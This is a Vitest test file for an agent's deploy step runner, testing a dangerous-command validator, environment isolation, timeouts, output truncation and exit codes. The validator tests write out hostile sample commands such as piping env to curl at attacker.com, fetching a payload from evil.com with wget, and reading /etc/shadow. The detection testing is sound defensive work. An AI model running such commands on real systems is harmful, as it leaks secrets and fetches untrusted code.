import { describe, it, expect } from "vitest";
import { runStep, validateCommand } from "../src/agent/step-runner.js";

describe("validateCommand", () => {
  it("returns empty array for safe commands", () => {
    expect(validateCommand("echo hello")).toEqual([]);
    expect(validateCommand("npm install")).toEqual([]);
    expect(validateCommand("ls -la")).toEqual([]);
  });

  it("flags env piping", () => {
    const warnings = validateCommand("env | curl attacker.com -d @-");
    expect(warnings.length).toBeGreaterThanOrEqual(2);
    expect(warnings.some(w => w.description.includes("environment"))).toBe(true);
  });

  it("flags eval usage", () => {
    const warnings = validateCommand('eval "$USER_INPUT"');
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("eval");
  });

  it("flags backtick substitution", () => {
    const warnings = validateCommand("echo `whoami`");
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("backtick");
  });

  it("flags rm -rf /", () => {
    const warnings = validateCommand("rm -rf /tmp/data");
    expect(warnings).toHaveLength(1);
  });
});

describe("runStep — environment isolation", () => {
  it("does NOT expose host process.env to step", async () => {
    // Set a "secret" env var that should NOT leak
    process.env.__TEST_SECRET_KEY__ = "supersecret";

    const result = await runStep(
      { id: "s1", name: "test", type: "pre-deploy", command: "echo $__TEST_SECRET_KEY__", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    // The output should be empty or just a newline, not "supersecret"
    expect(result.stdout.trim()).toBe("");

    delete process.env.__TEST_SECRET_KEY__;
  });

  it("passes declared variables to step", async () => {
    const result = await runStep(
      { id: "s2", name: "test", type: "pre-deploy", command: "echo $MY_VAR", order: 1 },
      { MY_VAR: "hello" },
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("hello");
  });

  it("includes PATH so commands can be found", async () => {
    const result = await runStep(
      { id: "s3", name: "test", type: "pre-deploy", command: "echo ok", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("ok");
  });
});

// ---------------------------------------------------------------------------
// validateCommand — additional patterns
// ---------------------------------------------------------------------------

describe("validateCommand — additional patterns", () => {
  it("flags wget usage", () => {
    const warnings = validateCommand("wget http://evil.com/payload");
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("wget");
  });

  it("flags curl with data flag", () => {
    const warnings = validateCommand("curl http://example.com -d secret");
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("curl");
  });

  it("flags /etc/shadow reference", () => {
    const warnings = validateCommand("cat /etc/shadow");
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("sensitive");
  });

  it("detects multiple dangerous patterns in a single command", () => {
    const warnings = validateCommand("eval `wget http://evil.com/script.sh`");
    expect(warnings.length).toBeGreaterThanOrEqual(3);
    const descriptions = warnings.map(w => w.description);
    expect(descriptions.some(d => d.includes("eval"))).toBe(true);
    expect(descriptions.some(d => d.includes("backtick"))).toBe(true);
    expect(descriptions.some(d => d.includes("wget"))).toBe(true);
  });

  it("returns pattern source for each warning", () => {
    const warnings = validateCommand("eval foo");
    expect(warnings[0].pattern).toBeDefined();
    expect(typeof warnings[0].pattern).toBe("string");
  });
});

// ---------------------------------------------------------------------------
// runStep — command timeout
// ---------------------------------------------------------------------------

describe("runStep — command timeout", () => {
  it("kills a command that exceeds the timeout", async () => {
    const result = await runStep(
      { id: "t1", name: "slow", type: "pre-deploy", command: "sleep 30", order: 1 },
      {},
      500, // 500ms timeout — the command will not finish in time
    );

    expect(result.success).toBe(false);
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBeNull();
    expect(result.durationMs).toBeGreaterThanOrEqual(400);
    expect(result.durationMs).toBeLessThan(5000);
  });

  it("does not time out when the command finishes before the deadline", async () => {
    const result = await runStep(
      { id: "t2", name: "fast", type: "pre-deploy", command: "echo done", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.timedOut).toBe(false);
    expect(result.exitCode).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// runStep — large stdout/stderr truncation
// ---------------------------------------------------------------------------

describe("runStep — output truncation", () => {
  it("truncates stdout longer than 2000 characters", async () => {
    // Generate a string well over 2000 chars by repeating a pattern
    const result = await runStep(
      {
        id: "trunc1",
        name: "big-stdout",
        type: "pre-deploy",
        command: "python3 -c \"print('A' * 5000)\"",
        order: 1,
      },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    // Output should be truncated to at most 2001 chars (ellipsis + 2000)
    expect(result.stdout.length).toBeLessThanOrEqual(2001);
    // Truncated output starts with the ellipsis character
    expect(result.stdout.startsWith("\u2026")).toBe(true);
  });

  it("truncates stderr longer than 2000 characters", async () => {
    const result = await runStep(
      {
        id: "trunc2",
        name: "big-stderr",
        type: "pre-deploy",
        command: "python3 -c \"import sys; sys.stderr.write('E' * 5000)\"",
        order: 1,
      },
      {},
      5000,
    );

    // The command itself succeeds (exit 0) even though stderr is noisy
    expect(result.success).toBe(true);
    expect(result.stderr.length).toBeLessThanOrEqual(2001);
    expect(result.stderr.startsWith("\u2026")).toBe(true);
  });

  it("does not truncate output shorter than 2000 characters", async () => {
    const result = await runStep(
      {
        id: "trunc3",
        name: "small-stdout",
        type: "pre-deploy",
        command: "echo short",
        order: 1,
      },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("short");
    expect(result.stdout.startsWith("\u2026")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// runStep — non-zero exit codes
// ---------------------------------------------------------------------------

describe("runStep — non-zero exit codes", () => {
  it("reports failure for exit code 1", async () => {
    const result = await runStep(
      { id: "e1", name: "fail", type: "pre-deploy", command: "exit 1", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.timedOut).toBe(false);
  });

  it("captures the exact non-zero exit code", async () => {
    const result = await runStep(
      { id: "e2", name: "fail-42", type: "pre-deploy", command: "exit 42", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(42);
  });

  it("reports success for exit code 0", async () => {
    const result = await runStep(
      { id: "e3", name: "ok", type: "pre-deploy", command: "true", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.exitCode).toBe(0);
  });

  it("captures stderr from a failing command", async () => {
    const result = await runStep(
      {
        id: "e4",
        name: "fail-msg",
        type: "pre-deploy",
        command: "echo 'oops' >&2 && exit 1",
        order: 1,
      },
      {},
      5000,
    );

    expect(result.success).toBe(false);
    expect(result.stderr.trim()).toBe("oops");
  });
});

// ---------------------------------------------------------------------------
// runStep — signal handling
// ---------------------------------------------------------------------------

describe("runStep — signal handling", () => {
  it("records durationMs for every execution", async () => {
    const result = await runStep(
      { id: "d1", name: "timed", type: "pre-deploy", command: "echo hi", order: 1 },
      {},
      5000,
    );

    expect(result.durationMs).toBeGreaterThanOrEqual(0);
    expect(typeof result.durationMs).toBe("number");
  });

  it("reports timedOut=true and exitCode=null when the process is killed", async () => {
    // A long-running command with a very short timeout simulates a killed process
    const result = await runStep(
      { id: "sig1", name: "killed", type: "pre-deploy", command: "sleep 60", order: 1 },
      {},
      200,
    );

    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBeNull();
    expect(result.success).toBe(false);
  });

  it("handles a command that does not exist gracefully", async () => {
    const result = await runStep(
      { id: "sig2", name: "no-cmd", type: "pre-deploy", command: "nonexistent_cmd_xyz", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(false);
    expect(result.timedOut).toBe(false);
    expect(result.stderr.length).toBeGreaterThan(0);
  });
});
